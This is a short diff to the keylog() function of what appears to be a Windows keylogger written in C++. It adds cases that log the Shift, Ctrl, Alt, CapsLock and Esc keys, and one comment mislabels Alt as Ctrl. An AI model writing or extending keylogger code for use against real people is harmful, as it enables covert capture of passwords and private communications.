@@ -87,17 +87,34 @@ void keylog(){
 						case VK_TAB:
 							write << "<Tab>"; //tab (0x09)
 							break;
-							
-						case VK_RETURN: 
-							write << "<Enter>\n";  //enter (0x0D)
+						
+						case VK_SHIFT:
+							write << "<Shift>"; //Shift (0x10) 
+							break;
+						
+						case VK_CONTROL:
+							write << "<Ctrl>"; //Ctrl (0x11) 
+							break;
+						
+						case VK_MENU:
+							write << "<Alt>"; //Ctrl (0x12) 
+							break;
+
+						case VK_CAPITAL:
+							write << "<CapsLock>"; //Caps Lock (0x14) 
 							break;
 							
+						case VK_ESCAPE:
+							write << "<Esc>"; //Esc (0x1B) 
+							break;
+
 						case VK_SPACE:
 							write << "<Space>"; //space (0x20)
 							break;
 
-						case VK_ESCAPE:
-							write << "<Esc>"; //Esc (0x1B) 
+						case VK_RETURN: 
+							write << "<Enter>\n";  //enter (0x0D)
+							break;
 					}
 				}					
 			}
